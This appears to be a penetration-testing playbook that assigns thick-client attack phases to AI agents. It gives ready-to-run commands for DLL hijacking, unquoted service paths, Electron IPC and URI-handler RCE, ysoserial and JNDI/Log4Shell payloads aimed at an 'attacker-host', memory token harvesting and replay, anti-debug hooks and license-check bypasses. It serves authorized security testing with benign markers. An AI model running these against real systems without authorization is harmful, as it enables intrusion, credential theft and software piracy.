## PHASE 8: LOCAL ATTACK SURFACE & PRIVILEGE ESCALATION

**Objective:** Find local primitives that let a standard user escalate or persist: insecure file/registry ACLs, DLL search-order hijacking, unquoted service paths, IPC/named-pipe abuse, custom URI handlers, and privileged-helper trust violations.

**Expert rationale:** Thick clients install services, helpers, scheduled tasks and handlers that run with more privilege than the user — each is a potential SYSTEM/root path. This is classic local priv-esc, and the install footprint from Phase 1 already pointed at the candidates.

**Gate-in:** Phase 1 footprint + installer analysis; admin/standard user split in the VM.

### 8.1 Insecure File / Directory ACLs

- **Objective / hypothesis:** A standard user can modify files/dirs used by a privileged component.
- **Procedure:**
```powershell
icacls "C:\Program Files\App" /T 2>$null | findstr /i "Users Everyone Authenticated"
# Linux/macOS
find /opt/App /usr/local/App -perm -o+w -o -perm -g+w 2>/dev/null -printf '%M %p\n'
accesschk.exe -w -s "Users" "C:\Program Files\App" -accepteula
```
- **Indicators:** `Users:(W)`/world-writable on executables, DLLs, configs, or service binaries running elevated.
- **Validation:** Replace a benign target file and confirm the privileged process loads/runs it.
- **Evasion / edge cases:** Writable config that drives a privileged action is as good as a writable binary.
- **Severity:** High (CWE-732/269).
- **Dispatch:** -> DesktopAppAgent.

### 8.2 Insecure Registry ACLs

- **Objective / hypothesis:** A standard user can write HKLM keys that control privileged behavior (service ImagePath, run keys).
- **Procedure:**
```powershell
accesschk.exe -k -w "Users" HKLM\SYSTEM\CurrentControlSet\Services\AppSvc -accepteula
accesschk.exe -k -w "Users" HKLM\SOFTWARE\App -accepteula
```
- **Indicators:** `Users` has write to a service key or a key the elevated process reads.
- **Validation:** Modify the value (e.g. ImagePath) and confirm the privileged consumer honors it.
- **Severity:** High (CWE-269).
- **Dispatch:** -> DesktopAppAgent.

### 8.3 DLL Search-Order Hijacking / Planting

- **Objective / hypothesis:** A privileged process loads a DLL by name from a writable directory in its search order.
- **Procedure:**
```text
# Procmon: filter Process=App* AND Result=NAME NOT FOUND AND Path ends with .dll  -> missing-DLL candidates
```
```bash
# Plant a benign proxy DLL in the first writable search location:
msfvenom -p windows/x64/exec CMD='cmd /c echo pwned > C:\\Users\\Public\\dllhijack.txt' -f dll -o "$OUT/findings/benign.dll"
# Confirm the writable dir precedes System32 in the order (app dir / CWD / PATH entry).
```
- **Indicators:** Procmon shows a NAME NOT FOUND .dll then a load from a writable dir; planted DLL executes.
- **Validation:** Marker file appears, written by the elevated process (check owner).
- **Evasion / edge cases:** Use a proxying DLL (forward exports) so the app keeps working; KnownDLLs/SafeDllSearchMode reduce candidates — focus on app-local and non-KnownDLLs names.
- **Severity:** High priv-esc / persistence (CWE-427/426).
- **Dispatch:** -> DesktopAppAgent -> ExploitChainAgent.

### 8.4 Unquoted Service Paths

- **Objective / hypothesis:** A SYSTEM service has an unquoted path with a space, letting a user-writable earlier segment hijack execution.
- **Procedure:**
```powershell
wmic service get name,pathname,startmode | findstr /i /v """ | findstr /i "Program Files" | findstr /i "App"
sc qc AppSvc ; accesschk.exe -ucqv AppSvc -accepteula
# Exploit position e.g. C:\Program.exe for "C:\Program Files\App Name\svc.exe"
```
- **Indicators:** Unquoted path + a writable earlier directory + service runs as SYSTEM.
- **Validation:** Plant a benign exe at the hijack position; on service restart it runs as SYSTEM (marker owner = SYSTEM).
- **Severity:** Medium-High (CWE-428).
- **Dispatch:** -> DesktopAppAgent.

### 8.5 IPC / Named-Pipe / COM / D-Bus / XPC Abuse

- **Objective / hypothesis:** A privileged component exposes an IPC endpoint a low-priv user can talk to and drive privileged actions, or impersonate.
- **Procedure:**
```powershell
# Windows named pipes
pipelist.exe | findstr /i app ; accesschk.exe -w \pipe\AppPipe -accepteula
# COM
# OleViewDotNet: enumerate App's CLSIDs, check launch/access permissions and out-of-proc servers
```
```bash
# Unix sockets / D-Bus / XPC
find /tmp /var/run -name "*.sock" 2>/dev/null -printf '%M %p\n' | grep -i app
dbus-send --session --print-reply --dest=com.vendor.App /com/vendor/App com.vendor.App.PrivilegedAction string:'test'
# macOS XPC: inspect the privileged helper's MachServices; fuzz the XPC dictionary; check code-signing requirement on the connection
```
- **Indicators:** World-writable pipe/socket; IPC method performs a privileged action without verifying the caller; missing XPC `setCodeSigningRequirement`.
- **Validation:** Invoke the privileged method as a standard user and observe the privileged effect; for pipes, named-pipe impersonation yields a SYSTEM token.
- **Evasion / edge cases:** Some IPC checks the peer PID/signature — look for the gap; argument injection into the privileged action.
- **Severity:** High-Critical priv-esc (CWE-269/863).
- **Dispatch:** -> DesktopAppAgent ; if it shells out -> CommandInjectionAgent.

### 8.6 Custom URI / Protocol Handler Abuse

- **Objective / hypothesis:** The app registers a `scheme://` handler that passes attacker-controlled input into dangerous functions (argument/command injection, file ops) when triggered from a webpage/document.
- **Procedure:**
```powershell
reg query "HKCR" /s /f "URL Protocol" 2>$null | findstr /i app    # find the scheme
reg query "HKCR\appscheme\shell\open\command"                      # see how args are passed (%1)
```
```text
# Trigger from a browser/HTML to test injection (proxy the page through Burp):
#   appscheme://x" --inspect=0.0.0.0:9229            (Electron node debug -> RCE)
#   appscheme://x"; calc.exe                          (command/argument injection)
#   appscheme://load?file=..\..\..\Windows\Temp\x     (path traversal into a sink)
```
- **Indicators:** Handler launches with injected args; debug port opens; command runs; file op escapes intended dir.
- **Validation:** Benign proof (marker file / debug-port listening) reproduced from a crafted link.
- **Evasion / edge cases:** OS may prompt before launching — note if it doesn't; `%1` quoting flaws; Electron `--inspect`/`--remote-debugging-port` argument injection is a known RCE class.
- **Severity:** High-Critical (CWE-88/78/94).
- **Dispatch:** -> CommandInjectionAgent / RCEAgent ; Electron handler -> DesktopAppAgent.

### 8.7 Privileged Helper / Service Trust-Boundary Review

- **Objective / hypothesis:** A privileged helper performs actions on behalf of the unprivileged GUI without validating requests, enabling priv-esc.
- **Procedure:**
```bash
# Identify the helper (Phase 1 install), its privilege, and its request interface (IPC from 8.5).
# Send malformed/privileged requests as a standard user; check for path/command/arg injection and missing authz.
launchctl print system/com.vendor.App.Helper 2>/dev/null    # macOS
sc qc AppSvc                                                  # Windows
```
- **Indicators:** Helper executes a privileged op from an unauthenticated/unvalidated request.
- **Validation:** Standard-user request causes a SYSTEM/root effect (marker owner).
- **Severity:** Critical local priv-esc (CWE-269/250).
- **Dispatch:** -> DesktopAppAgent -> ExploitChainAgent.

**Phase artifacts:** ACL/accesschk outputs, Procmon NAME-NOT-FOUND DLL list, unquoted-path list, pipe/socket/COM/XPC enumeration, URI-handler command mapping, benign priv-esc proofs (marker owner=SYSTEM/root), findings to `/tmp/bb-findings-desktop.json`.

**Gate-out:** Every local primitive enumerated and confirmed/killed with a benign elevated marker. Advance to Phase 9.

---

## PHASE 9: ELECTRON-SPECIFIC ATTACKS

**Objective:** Exploit Electron misconfigurations: nodeIntegration, contextIsolation, preload exposure, IPC renderer->main, protocol/deep-link handlers, and DevTools/remote-debug.

**Expert rationale:** Electron turns a web XSS into desktop RCE the moment the renderer can reach Node. The webPreferences and preload surface decompiled in Phase 2.4 are confirmed here against the live app.

**Gate-in:** Electron confirmed (Phase 1.2); ASAR extracted (Phase 2.4).

### 9.1 ASAR Re-pack / Tamper Baseline

- **Objective / hypothesis:** The app does not verify ASAR integrity, so a tampered `app.asar` runs.
- **Procedure:**
```bash
cd "$OUT/static/electron_src"
# Add a benign marker to main.js, repack, replace, launch
echo "require('fs').writeFileSync(require('os').tmpdir()+'/asar_tamper.txt','ok')" >> main.js
npx --yes @electron/asar pack . ../app_tampered.asar
cp ../app_tampered.asar /path/to/resources/app.asar   # in the VM
```
- **Indicators:** Marker file created => no integrity/fuse enforcement (`EnableEmbeddedAsarIntegrityValidation` off).
- **Validation:** Marker present after launch.
- **Evasion / edge cases:** Electron Fuses / ASAR integrity (macOS) may block — note their presence/absence.
- **Severity:** High (CWE-354) — enables persistent local RCE / supply-chain on the box.
- **Dispatch:** -> DesktopAppAgent.

### 9.2 nodeIntegration Assessment

- **Objective / hypothesis:** A renderer with `nodeIntegration:true` (and reachable XSS or loaded remote content) yields RCE.
- **Procedure:**
```bash
grep -rniE "nodeIntegration\\s*:\\s*true" "$OUT/static/electron_src"
# If a renderer loads remote/user content with nodeIntegration true, PoC in that context:
#   <img src=x onerror="require('child_process').exec('id > /tmp/electron_rce')">
```
- **Indicators:** nodeIntegration true on a window that renders untrusted content; PoC spawns a process.
- **Validation:** Marker file / Collaborator beacon from the injected JS.
- **Evasion / edge cases:** Even nodeIntegration:false can be escaped via context-isolation-off preload (9.3) or IPC (9.4).
- **Severity:** Critical (CWE-94).
- **Dispatch:** -> DesktopAppAgent -> RCEAgent.

### 9.3 contextIsolation / Preload Exposure

- **Objective / hypothesis:** `contextIsolation:false` or an over-broad `contextBridge.exposeInMainWorld` lets the renderer reach powerful main-world/Node APIs.
- **Procedure:**
```bash
grep -rniE "contextIsolation\\s*:\\s*false|exposeInMainWorld" "$OUT/static/electron_src"
# Review every exposed API: does it (directly or transitively) reach fs/child_process/ipc with attacker input?
```
- **Indicators:** contextIsolation false; exposed bridge functions wrapping `fs`, `exec`, `shell.openExternal`, or a generic `invoke(channel,args)`.
- **Validation:** Call the exposed API from the renderer to achieve file write / command exec (benign marker).
- **Evasion / edge cases:** Prototype pollution in the preload to escape an otherwise-narrow bridge.
- **Severity:** Critical (CWE-94/501).
- **Dispatch:** -> DesktopAppAgent -> RCEAgent.

### 9.4 IPC renderer->main Abuse

- **Objective / hypothesis:** A main-process `ipcMain.handle`/`on` performs privileged actions (file/exec/window) using renderer-supplied args without validation.
- **Procedure:**
```bash
grep -rniE "ipcMain\\.(handle|on)\\(" "$OUT/static/electron_src" -A8 | tee "$OUT/static/ipc_handlers.txt"
# For each channel, craft a renderer call with malicious args:
#   ipcRenderer.invoke('open-file', '../../../../etc/passwd')
#   ipcRenderer.invoke('run-tool', '; touch /tmp/ipc_rce')
```
- **Indicators:** A channel reaches `child_process`/`fs`/`shell` with unsanitized args; PoC achieves traversal/exec.
- **Validation:** Benign marker via the channel.
- **Evasion / edge cases:** Sender validation (`event.senderFrame`) sometimes present — look for its absence; webview/iframe as the sender.
- **Severity:** Critical (CWE-94/78/22).
- **Dispatch:** -> DesktopAppAgent ; cmd -> CommandInjectionAgent ; path -> PathTraversalAgent.

### 9.5 Protocol Handler / Deep Link / openExternal

- **Objective / hypothesis:** A registered protocol or `shell.openExternal` with attacker-controlled URL triggers code execution or local file access.
- **Procedure:**
```bash
grep -rniE "setAsDefaultProtocolClient|shell\\.openExternal|will-navigate|new-window" "$OUT/static/electron_src"
# Trigger via crafted link (proxy page through Burp). Argument injection:
#   appscheme://x" --inspect-brk=0.0.0.0:9229          # opens node debugger -> RCE
#   openExternal('file:///etc/passwd') / openExternal('smb://attacker/share')
```
- **Indicators:** Debug port opens; `file://`/`smb://` opened; second-instance arg injection.
- **Validation:** Connect to the debug port (`chrome://inspect`) or observe the file/SMB fetch in Burp/Wireshark.
- **Evasion / edge cases:** `app.requestSingleInstanceLock` passes argv to the first instance — classic `--inspect` injection; `openExternal` allow-list bypass.
- **Severity:** Critical (CWE-88/94).
- **Dispatch:** -> DesktopAppAgent -> RCEAgent.

### 9.6 DevTools / Remote Debugging / webPreferences

- **Objective / hypothesis:** DevTools or a remote-debug port is reachable, or `webSecurity:false`/`allowRunningInsecureContent` weakens the renderer.
- **Procedure:**
```bash
grep -rniE "webSecurity\\s*:\\s*false|allowRunningInsecureContent|--inspect|--remote-debugging-port|openDevTools" "$OUT/static/electron_src"
nmap -p 9222,9229 127.0.0.1                # is a debug port listening?
```
- **Indicators:** Debug port open; DevTools openable; webSecurity disabled.
- **Validation:** `chrome://inspect` attaches; or fetch a cross-origin resource the disabled webSecurity now allows.
- **Evasion / edge cases:** Prod build may gate DevTools behind an env/flag — check Phase 2 `isDev` hits.
- **Severity:** High-Critical (CWE-489/94).
- **Dispatch:** -> DesktopAppAgent.

**Phase artifacts:** `ipc_handlers.txt`, webPreferences verdict, tamper/Fuse result, PoC markers/beacons, findings to `/tmp/bb-findings-desktop.json`.

**Gate-out:** Every webPreferences flag, preload export, IPC channel and handler tested; renderer->RCE paths proven or excluded. Advance to Phase 10.

---

## PHASE 10: .NET & JAVA DESERIALIZATION / FRAMEWORK ATTACKS

**Objective:** Confirm and weaponize managed-runtime bugs: .NET deserialization/remoting, Java deserialization, JNDI/Log4Shell, and RMI/JMX.

**Expert rationale:** Managed clients (and their backends) frequently deserialize untrusted data from network, files, IPC, or clipboard. A reachable insecure deserializer with a present gadget chain is reliable RCE — the highest-value managed finding.

**Gate-in:** Phase 2 sink inventory (`dotnet_deser.txt`, `java_deser.txt`, `java_jndi.txt`) with reachable inputs and dependency/gadget availability.

### 10.1 .NET Deserialization & Remoting

- **Objective / hypothesis:** A reachable `BinaryFormatter`/`SoapFormatter`/`LosFormatter`/`Json.NET TypeNameHandling`/ViewState/remoting sink deserializes attacker data.
- **Procedure:**
```bash
cd "$OUT/findings"
# Generate a benign-proof gadget (touch a marker / OOB beacon, never destructive)
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c echo pwn > %TEMP%\\dnet_deser.txt" -o base64 > deser_payload.b64
# Inject into the reachable channel: intercepted network field (via Burp), local file (ViewState/config), IPC, clipboard.
# Remoting:
grep -rniE "RemotingConfiguration|TcpChannel|RegisterWellKnownServiceType" "$OUT/static/dotnet_src"
ExploitRemotingService.exe -s tcp://127.0.0.1:PORT/Service -c "cmd /c echo pwn > %TEMP%\\remoting.txt"
```
- **Indicators:** Marker file created / OOB beacon on payload delivery; exception traces naming the formatter.
- **Validation:** Deterministic repro; OOB token matches; confirm the gadget chain is actually present on the client's framework version.
- **Evasion / edge cases:** `TypeNameHandling.Auto/All` in Json.NET; `SerializationBinder` allow-lists (find a permitted gadget); ViewState needs the leaked `machineKey` (Phase 2/3); no public gadget => mine a custom one (ReverseEngineeringAgent).
- **Severity:** Critical (CWE-502).
- **Dispatch:** -> DeserializationAgent ; custom-gadget mining -> ReverseEngineeringAgent ; weaponize -> ExploitChainAgent.

### 10.2 Java Deserialization

- **Objective / hypothesis:** A reachable `ObjectInputStream.readObject`/`XStream`/`SnakeYAML`/`Kryo` sink + a gadget lib on the classpath = RCE.
- **Procedure:**
```bash
cd "$OUT/findings"
# Pick the chain matching the classpath (from Phase 2.3 dependency review)
java -jar ysoserial.jar CommonsCollections6 "touch /tmp/java_deser" > deser_java.bin
# Deliver via the reachable channel (network field via Burp, file, IPC, RMI). For detection-only use URLDNS:
java -jar ysoserial.jar URLDNS "http://<collab-subdomain>/" > urldns.bin
bun skills/BugBountyFramework/Tools/burp-bridge.ts --collaborator-poll &
```
- **Indicators:** Marker created (RCE) or Collaborator DNS hit (URLDNS proves the sink deserializes attacker data).
- **Validation:** RCE marker deterministic; URLDNS callback confirms reachability before chasing a full gadget.
- **Evasion / edge cases:** `ObjectInputFilter`/look-ahead allow-lists; shaded/old gadget versions; XStream/SnakeYAML have their own payloads; pick CC1 vs CC6 by JDK.
- **Severity:** Critical (CWE-502).
- **Dispatch:** -> DeserializationAgent ; weaponize -> ExploitChainAgent.

### 10.3 JNDI Injection / Log4Shell

- **Objective / hypothesis:** Attacker-controlled input reaches a JNDI `lookup` (incl. Log4j `${jndi:...}`), enabling remote class load.
- **Procedure:**
```bash
# Stand up a JNDI server
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker-host/#Exploit" 1389 &
# Detection-first via Collaborator DNS:
#   inject:  ${jndi:dns://<collab-subdomain>/x}   then escalate to ldap:// if it resolves
bun skills/BugBountyFramework/Tools/burp-bridge.ts --collaborator-poll &
grep -rniE "log4j-core" "$OUT/static" 2>/dev/null
```
- **Indicators:** Collaborator DNS/LDAP hit; class load on the LDAP server.
- **Validation:** DNS callback first (safe), then controlled class load proves RCE.
- **Evasion / edge cases:** `log4j2.formatMsgNoLookups`/patched versions; nested/obfuscated `${lower:j}ndi`; trustURLCodebase defaults vary by JDK.
- **Severity:** Critical (CWE-917).
- **Dispatch:** -> RCEAgent -> ExploitChainAgent.

### 10.4 RMI / JMX Exploitation

- **Objective / hypothesis:** The client/backend exposes an RMI registry or JMX endpoint allowing remote method/MBean abuse.
- **Procedure:**
```bash
nmap -p 1099,9010,9011 -sV target | tee "$OUT/findings/rmi_jmx.txt"
java -jar rmg.jar enum target 1099
java -jar rmg.jar exploit target 1099 CommonsCollections6 "touch /tmp/rmi"   # only if in scope + authorized
java -jar beanshooter.jar enum target 9010
```
- **Indicators:** Exposed registry/MBean server; deserialization or MLet deployment succeeds.
- **Validation:** Marker / authorized MBean action; confirm endpoint is in scope.
- **Evasion / edge cases:** Auth on JMX; firewalled dynamic RMI ports; only test if explicitly authorized and in scope.
- **Severity:** Critical (CWE-502/306).
- **Dispatch:** -> DeserializationAgent / RCEAgent -> ExploitChainAgent.

**Phase artifacts:** generated payloads (benign-proof), `rmi_jmx.txt`, Collaborator hit logs, marker files, findings to `/tmp/bb-findings-deser.json` and `/tmp/bb-findings-rce.json`.

**Gate-out:** Every managed sink either proven (benign marker/OOB) or excluded (no reachable gadget/patched). Advance to Phase 11.

---

## PHASE 11: RUNTIME, MEMORY, ANTI-TAMPER & LICENSE BYPASS

**Objective:** Use dynamic instrumentation to confirm crypto material, find secrets in memory (incl. post-logout), and bypass anti-tamper/anti-debug, integrity, and license/feature gates.

**Expert rationale:** Some truths only appear at runtime — the decryption key, the plaintext after pinning, the token still resident after logout, the comparison that gates the license. Defeating anti-tamper is the prerequisite for clean instrumentation; the bypass itself is often a reportable resilience finding.

**Gate-in:** Phases 2 (sinks/crypto/license logic located) and 4 (Frida working) complete.

### 11.1 Crypto Material & Key Recovery (dynamic)

- **Objective / hypothesis:** The app derives/uses keys at runtime that are recoverable by hooking the crypto API.
- **Procedure:**
```bash
frida -p $(pgrep -f application) -l - <<'JS' -o "$OUT/runtime/crypto.log"
['CryptDecrypt','BCryptDecrypt'].forEach(function (fn) {
  var p = Module.findExportByName('advapi32.dll', fn) || Module.findExportByName('bcrypt.dll', fn);
  if (p) Interceptor.attach(p, { onLeave: function () { try { console.log(hexdump(this.context.r8, {length:256})); } catch(e){} } });
});
JS
# .NET: hook Aes.Create/ICryptoTransform; Java: hook javax.crypto.Cipher.doFinal via frida-java-bridge
```
- **Indicators:** Hooked plaintext/keys/IVs; weak algo/mode (ECB, static IV) confirmed at runtime.
- **Validation:** Use the recovered key to decrypt a stored blob (Phase 3) offline.
- **Evasion / edge cases:** Custom/native crypto => hook by address (Phase 2.1).
- **Severity:** Medium-High (CWE-327/321).
- **Dispatch:** -> SecretsExposureAgent ; algorithm detail -> ReverseEngineeringAgent.

### 11.2 Memory Secret Analysis (incl. post-logout)

- **Objective / hypothesis:** Credentials/tokens persist in process memory, including after logout.
- **Procedure:**
```bash
cd "$OUT/runtime"
# Login, dump
procdump -ma application.exe pre_logout.dmp 2>/dev/null || gcore -o pre_logout $(pgrep -f application)
strings pre_logout*.dmp | grep -iE "bearer|password|token|api[_-]?key" | tee mem_pre.txt
# Logout in the app, dump again
procdump -ma application.exe post_logout.dmp 2>/dev/null || gcore -o post_logout $(pgrep -f application)
strings post_logout*.dmp | grep -iE "bearer|password|token|api[_-]?key" | tee mem_post.txt
diff mem_pre.txt mem_post.txt | tee mem_diff.txt
```
- **Indicators:** Secrets present in pre-dump; still present in post-logout dump (`mem_post.txt` non-empty).
- **Validation:** Replay a token found in the post-logout dump against the backend — if it works, the client failed to wipe + the server failed to revoke.
- **Evasion / edge cases:** GC may move/retain managed strings; SecureString/`SecureZeroMemory` usage (or its absence) is the point.
- **Severity:** Medium-High (CWE-316/226).
- **Dispatch:** -> SecretsExposureAgent ; live post-logout token also -> AuthAgent.

### 11.3 Targeted Function Hooking (auth/license/flags)

- **Objective / hypothesis:** A single function decides auth/license/feature state and can be forced.
- **Procedure:**
```bash
frida -p $(pgrep -f application) -l - <<'JS' -o "$OUT/runtime/hook.log"
// Force a managed/native boolean check to true (locate the symbol/addr in Phase 2)
var addr = Module.findExportByName(null, 'IsLicenseValid');   // or Debugger- resolved address
if (addr) Interceptor.replace(addr, new NativeCallback(function(){ return 1; }, 'int', []));
JS
```
- **Indicators:** Premium/admin features unlock; license dialog suppressed.
- **Validation:** Feature genuinely functions post-hook (not just UI cosmetic).
- **Evasion / edge cases:** Multiple/server-side checks; integrity self-check detects the hook (defeat via 11.4 first).
- **Severity:** Varies; see 11.5 for license impact.
- **Dispatch:** -> DesktopAppAgent ; native -> ReverseEngineeringAgent.

### 11.4 Anti-Tamper / Anti-Debug / Integrity Bypass

- **Objective / hypothesis:** The client uses anti-debug/anti-Frida/integrity checks that can be neutralized (and whose presence/absence is itself a resilience finding).
- **Procedure:**
```bash
# Identify checks (Phase 2): IsDebuggerPresent, ptrace(PT_DENY_ATTACH), CheckRemoteDebuggerPresent, Frida-port scans, checksum self-verify.
frida -p $(pgrep -f application) -l - <<'JS'
['IsDebuggerPresent','CheckRemoteDebuggerPresent'].forEach(function(fn){
  var p = Module.findExportByName('kernel32.dll', fn);
  if (p) Interceptor.replace(p, new NativeCallback(function(){return 0;}, 'int', []));
});
var ptrace = Module.findExportByName(null,'ptrace');
if (ptrace) Interceptor.replace(ptrace, new NativeCallback(function(){return 0;}, 'long', ['int','int','pointer','pointer']));
JS
```
- **Indicators:** Debugger/Frida attach now succeeds; integrity check passes after patch.
- **Validation:** Attach a debugger and step through a previously-protected routine.
- **Evasion / edge cases:** Self-checksumming detects in-memory patches => hook the checksum compare instead; obfuscated VM-protected checks need address-level patching.
- **Severity:** Low-Medium as a standalone resilience gap (CWE-388); enabling for everything else.
- **Dispatch:** -> ReverseEngineeringAgent / DesktopAppAgent.

### 11.5 License / Trial / Feature-Flag Bypass

- **Objective / hypothesis:** Licensing/trial/feature gating is enforced client-side and bypassable by patching or hooking.
- **Procedure:**
```bash
# Static patch (dnSpy for .NET): invert the license branch (brfalse<->brtrue) or force IsLicensed=>true, save module.
# Or runtime hook (11.3). Confirm offline (no server re-check) vs online (server-validated).
```
- **Indicators:** Full/premium functionality without a valid license; trial reset; flags flipped.
- **Validation:** The unlocked feature performs real work, persists across restart (for a static patch), and isn't re-gated by the server.
- **Evasion / edge cases:** Server-side entitlement re-check defeats client patching — note when licensing is correctly server-enforced (not a bypass).
- **Severity:** Medium-High business impact (revenue/IP; CWE-682/602) depending on enforcement model.
- **Dispatch:** -> DesktopAppAgent.

**Phase artifacts:** `crypto.log`, `mem_pre/post.txt` + `mem_diff.txt`, `hook.log`, anti-tamper bypass notes, patched-module proof, findings to `/tmp/bb-findings-desktop.json` and `/tmp/bb-findings-secrets.json`.

**Gate-out:** Crypto/keys recovered; memory hygiene (incl. post-logout) assessed; anti-tamper/license posture determined with benign proofs. Proceed to Reporting & Hand-off.

---

## Reporting & Hand-off

Aggregate, validate, correlate, and deliver. No raw finding ships without passing through this pipeline.

### Step 1 — Aggregate

```bash
cat /tmp/bb-findings-*.json 2>/dev/null | jq -s 'add' > "$OUT/findings/aggregate.json"
cp /tmp/bb-findings-*.json "$OUT/findings/" 2>/dev/null
# Ensure every finding carries: class, location (binary/module/function/endpoint), reachable input,
# benign PoC artifact path under $OUT, and a proposed CVSS.
```

### Step 2 — ValidatorAgent

Hand `$OUT/findings/aggregate.json` to **ValidatorAgent** to:
- Reproduce each finding from its artifact (re-run the hook/payload/marker).
- De-duplicate by root cause (e.g. one missing-signature-verification root cause may surface across update, ASAR, and license).
- Score CVSS 3.1/4.0 and apply the hunt-mode gate (drop unconfirmed/speculative; keep only reproduced, in-scope issues).
- Distinguish client-side (needs victim/privilege delta) from server-side (live impact) severity.

### Step 3 — ExploitChainAgent

Hand the validated set to **ExploitChainAgent** to correlate single findings into kill chains and elevate combined CVSS. Canonical thick-client chains:
- Leaked secret (Phase 2/3) -> backend auth (5.1) -> BOLA mass-extraction (5.2).
- Pinning bypass (4.2) -> server-side injection (5.3) -> backend RCE.
- DLL hijack / unquoted path / IPC (8) -> SYSTEM -> persistence.
- Update hijack (7.2) -> fleet-wide RCE + persistence (the apex chain).
- contextIsolation-off + IPC (9.3/9.4) -> renderer RCE -> child priv-esc via a privileged helper (8.7).

### Step 4 — Final report

Per finding, emit:

```markdown
## Finding: [Title]
**Surface:** client-side | server-side    **Phase/Technique:** [e.g. 7.2]
**Severity:** Critical/High/Medium/Low    **CVSS 3.1:** X.X (vector)    **CWE:** CWE-XXX
**Affected component:** [binary/module/function/endpoint + offset/address]
**Reachable input:** [network / file / registry / IPC / URI / synced data]
### Description / Reproduction
1. [tool + exact command, proxy-aware]  2. [action]  3. [observed result]
### Evidence
- [artifact paths under $OUT: decompiled snippet, hook log, HAR, dump diff, marker owner]
### Impact
[what the attacker achieves + prerequisites]
### Remediation
[code/config/architecture fix: parameterize, sign+verify updates, contextIsolation:true,
 ServerCertificate pinning done right, server-side authz, secret in OS store w/ entropy, etc.]
### References
[CWE link, framework hardening guide, vendor advisory]
```

### Step 5 — Concise N-point update

Produce a short numbered list of the new tests performed this run (one line each, e.g.):

```text
1. Forced + unpinned TLS via Frida; captured full backend API contract.
2. Confirmed cross-tenant BOLA on /v1/orders/{id} with two identities.
3. Proved unsigned HTTP auto-update -> fleet-wide RCE (benign marker).
4. DLL search-order hijack on AppSvc -> SYSTEM (marker owner=SYSTEM).
5. Electron IPC 'run-tool' channel -> command injection -> local RCE.
6. .NET BinaryFormatter sink reachable from IPC -> RCE (ysoserial benign).
7. Session token resident + valid post-logout (memory dump diff + replay).
```

---

## WORKFLOW EXECUTION CHECKLIST

- [ ] Pre-Flight: Burp health/scope, CA trusted per runtime, two identities vaulted, authed session, hard scope guard, snapshot VM
- [ ] Phase 1: runtime fingerprinted, installer analyzed, FS/registry/network footprint mapped, AppProfile seeded
- [ ] Phase 2: native/.NET/Java/Electron decompiled, secrets + sinks + crypto + pinning catalogued
- [ ] Phase 3: config, registry, local DB, OS cred stores, logs audited; secrets validated live/dead
- [ ] Phase 4: traffic forced through Burp, pinning bypassed via Frida, endpoints + auth scheme enumerated
- [ ] Phase 5: server-side auth, BOLA/BFLA/mass-assignment, injection, business-logic tested with two identities
- [ ] Phase 6: client-side local SQLi, eval/exec RCE, command injection, path traversal confirmed or killed
- [ ] Phase 7: update transport, signature, downgrade, staging/TOCTOU tested; hijack proven with benign marker
- [ ] Phase 8: file/registry ACLs, DLL hijack, unquoted paths, IPC/pipes, URI handlers, privileged helper
- [ ] Phase 9 (Electron): ASAR integrity, nodeIntegration, contextIsolation/preload, IPC, protocol handlers, DevTools
- [ ] Phase 10 (managed): .NET + Java deserialization, JNDI/Log4Shell, RMI/JMX
- [ ] Phase 11: crypto/key recovery, memory secrets (post-logout), anti-tamper, license/feature bypass
- [ ] Reporting: aggregate -> ValidatorAgent -> ExploitChainAgent -> final report + N-point update
